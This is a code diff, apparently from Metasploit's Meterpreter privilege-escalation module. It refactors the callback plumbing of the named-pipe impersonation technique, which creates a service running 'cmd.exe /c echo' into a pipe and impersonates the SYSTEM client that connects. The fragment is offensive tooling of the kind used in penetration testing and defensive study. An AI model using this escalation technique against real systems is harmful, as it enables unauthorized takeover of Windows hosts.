@@ -34,10 +34,9 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
 	HANDLE hPipe                                 = NULL;
 	HANDLE hSem                                  = NULL;
 	char * cpPipeName                            = NULL;
-	Remote * remote                              = NULL;
 	BYTE bMessage[128]                           = {0};
 	DWORD dwBytes                                = 0;
-	PostImpersonationCallback fPostImpersonation = NULL;
+	PPRIV_POST_IMPERSONATION pPostImpersonation  = NULL;
 
 	do {
 		if (!thread) {
@@ -45,11 +44,10 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
 		}
 
 		cpPipeName         = (char *)thread->parameter1;
-		remote             = (Remote *)thread->parameter2;
-		hSem               = (HANDLE)thread->parameter3;
-		fPostImpersonation = (PostImpersonationCallback)thread->parameter4;
+		hSem               = (HANDLE)thread->parameter2;
+		pPostImpersonation = (PPRIV_POST_IMPERSONATION)thread->parameter3;
 
-		if (!cpPipeName || !remote) {
+		if (!cpPipeName) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread.  invalid thread arguments",
 				ERROR_BAD_ARGUMENTS);
 		}
@@ -96,8 +94,8 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
 				CONTINUE_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. ImpersonateNamedPipeClient failed");
 			}
 
-			if (fPostImpersonation) {
-				dwResult = fPostImpersonation(remote);
+			if (pPostImpersonation) {
+				dwResult = pPostImpersonation->pCallback(pPostImpersonation->pCallbackParam);
 				if (dwResult != ERROR_SUCCESS) {
 					RevertToSelf();
 					CONTINUE_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. the post impersonation callback failed");
@@ -128,13 +126,14 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
  */
 DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 {
-	DWORD dwResult              = ERROR_SUCCESS;
-	char * cpServiceName        = NULL;
-	THREAD * pThread            = NULL;
-	HANDLE hSem                 = NULL;
-	char cServiceArgs[MAX_PATH] = {0};
-	char cServicePipe[MAX_PATH] = {0};
-	OSVERSIONINFO os            = {0};
+	DWORD dwResult                            = ERROR_SUCCESS;
+	char * cpServiceName                      = NULL;
+	THREAD * pThread                          = NULL;
+	HANDLE hSem                               = NULL;
+	char cServiceArgs[MAX_PATH]               = {0};
+	char cServicePipe[MAX_PATH]               = {0};
+	OSVERSIONINFO os                          = {0};
+	PRIV_POST_IMPERSONATION PostImpersonation;
 
 	do {
 		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
@@ -162,7 +161,10 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 			"cmd.exe /c echo %s > %s", cpServiceName, cServicePipe);
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem, post_callback_use_self);
+		PostImpersonation.pCallback = post_callback_use_self;
+		PostImpersonation.pCallbackParam = remote;
+
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, hSem, &PostImpersonation);
 		if (!pThread) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.create failed",
 				ERROR_INVALID_HANDLE);
@@ -235,20 +237,21 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
  */
 DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 {
-	DWORD dwResult              = ERROR_SUCCESS;
-	THREAD * pThread            = NULL;
-	HANDLE hServiceFile         = NULL;
-	HANDLE hSem		    = NULL;
-	LPVOID lpServiceBuffer      = NULL;
-	char * cpServiceName        = NULL;
-	THREAD * pthread            = NULL;
-	char cServicePath[MAX_PATH] = {0};
-	char cServiceArgs[MAX_PATH] = {0};
-	char cServicePipe[MAX_PATH] = {0};
-	char cTempPath[MAX_PATH]    = {0};
-	DWORD dwBytes               = 0;
-	DWORD dwTotal               = 0;
-	DWORD dwServiceLength       = 0;
+	DWORD dwResult                            = ERROR_SUCCESS;
+	THREAD * pThread                          = NULL;
+	HANDLE hServiceFile                       = NULL;
+	HANDLE hSem                               = NULL;
+	LPVOID lpServiceBuffer                    = NULL;
+	char * cpServiceName                      = NULL;
+	THREAD * pthread                          = NULL;
+	char cServicePath[MAX_PATH]               = {0};
+	char cServiceArgs[MAX_PATH]               = {0};
+	char cServicePipe[MAX_PATH]               = {0};
+	char cTempPath[MAX_PATH]                  = {0};
+	DWORD dwBytes                             = 0;
+	DWORD dwTotal                             = 0;
+	DWORD dwServiceLength                     = 0;
+	PRIV_POST_IMPERSONATION PostImpersonation;
 
 	do
 	{
@@ -298,7 +301,10 @@ DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 		}
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem, post_callback_use_self);
+		PostImpersonation.pCallback = post_callback_use_self;
+		PostImpersonation.pCallbackParam = remote;
+
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, hSem, &PostImpersonation);
 		if (!pThread) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. met_api->thread.create failed",
 				ERROR_INVALID_HANDLE);
